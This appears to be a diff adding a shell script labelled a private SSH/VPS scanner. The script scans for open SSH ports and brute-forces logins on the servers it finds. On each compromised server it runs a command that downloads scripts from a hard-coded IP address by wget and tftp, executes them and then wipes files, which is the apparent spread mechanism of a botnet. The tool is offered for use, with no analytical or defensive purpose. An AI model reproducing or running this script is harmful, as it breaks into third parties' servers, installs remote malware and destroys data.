@@ -1,0 +1,36 @@
+rm -rf bios.txt
+rm -rf mfu.txt
+rm -rf banner.log
+timeout="68"
+speed="10"
+interface="em1"
+port="22"
+echo -e "\e[34m####################################################"
+echo -e "\e[34m#        \e[32mPrivate SSH / VPS Scanner                 \e[34m#"
+echo -e "\e[34m#        \e[32mDeveloped By Nite Max                     \e[34m#"
+echo -e "\e[34m#        \e[32mDon't Leak This You Piece of Shit!!       \e[34m#"
+echo -e "\e[34m####################################################"
+
+sleep 5
+
+
+
+./motd
+
+
+sleep 1
+timeout $timeout ./shitscanner $port -i $interface -s $speed
+pkill shitscanner
+sleep 2
+./boner bios.txt 22 3500
+pkill boner
+
+victims=`grep -c . bios.txt`
+
+echo -e "\e[35m[PRIVATE] \e[97mHRDMV1 - \e[32mBrute Force Starting !!!"
+echo -e "\e[35m[PRIVATE] \e[97mHRDMV1 - \e[32mWe Have \e[91m$victims \e[32mvulnerable servers"
+sleep 1
+clear
+./brute 7000 -f bios.txt naffey 22 "cd /tmp || cd /run || cd /; wget http://89.42.133.67/axisbins.sh; chmod 777 axisbins.sh; sh axisbins.sh; tftp 89.42.133.67 -c get axistftp1.sh; chmod 777 axistftp1.sh; sh axistftp1.sh; tftp -r axistftp2.sh -g 89.42.133.67; chmod 777 axistftp2.sh; sh axistftp2.sh; rm -rf axisbins.sh axistftp1.sh axistftp2.sh; rm -rf *"
+clear
+echo -e "\e[35m[PRIVATE] \e[97mHRDMV1 - \e[32mScan Has Been Finished ! All Output has been saved in --> \e[91mgasite.txt"
